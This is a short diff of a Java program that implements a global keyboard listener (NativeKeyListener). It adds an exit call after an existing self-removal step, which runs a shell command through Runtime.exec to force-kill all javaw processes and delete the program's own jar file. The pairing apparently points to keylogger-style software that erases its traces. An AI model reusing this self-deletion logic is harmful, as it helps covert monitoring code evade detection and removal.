@@ -31,6 +31,7 @@ public class Main implements NativeKeyListener{
 			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 			 @SuppressWarnings("unused")
 			Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf);
+			System.exit(0);
 		}
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 		// System.out.println("Location " + yiffyiff);
